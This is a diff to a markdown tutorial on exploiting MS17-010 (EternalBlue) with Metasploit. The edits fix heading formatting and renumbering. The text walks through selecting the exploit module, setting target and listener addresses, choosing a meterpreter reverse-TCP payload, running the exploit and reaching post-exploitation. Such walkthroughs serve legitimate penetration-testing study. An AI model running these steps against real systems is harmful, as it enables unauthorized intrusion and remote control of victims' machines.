@@ -12,17 +12,17 @@ Once inside Metasploit, you can search for the EternalBlue module using:
 
 ```show module```
 
-##3. Search for the MS17-010 EternalBlue Exploit Module
+## 3. Search for the MS17-010 EternalBlue Exploit Module
 To search for a specific module:
 
 ```search ms17-010```
 
-##4. Select the Exploit Module
+## 4. Select the Exploit Module
 After finding the appropriate exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue), select it by entering:
 
 `use exploit/windows/smb/ms17_010_eternalblue`
 
-##5. Set Required Parameters
+## 5. Set Required Parameters
 
 ```Set RHOSTS <Target IP>```
 
@@ -34,21 +34,21 @@ Review other options that might need configuration using the `show options` comm
 | LHOST     | Local host listening IP for payloads  | set LHOST 192.168.1.2 |
 | RPORT     | Remote port for the target service    | set RPORT 445         |
 -----------------------------------------------------------------------------
-##6. Set Payload
+## 6. Set Payload
 
 After selecting the exploit module, you need to set the payload that will be delivered to the compromised system. This payload determines the action or code executed on the target after exploitation.
 For example, to set the payload as a reverse shell for a Windows target:
 
 ```set payload windows/meterpreter/reverse_tcp```
 
-##7. Execute the Exploit
+## 7. Execute the Exploit
 Once all necessary options are set, run the exploit by typing:
 
 ```exploit```
 
 The exploit might take some time to run. Upon successful exploitation, Metasploit may display the meterpreter prompt, indicating a successful compromise of the target system.
 
-## 10. Post-Exploitation Actions
+## 8. Post-Exploitation Actions
 
 Once the exploit succeeds and you gain access to the compromised system, you can perform various post-exploitation actions using the `meterpreter` prompt.
 
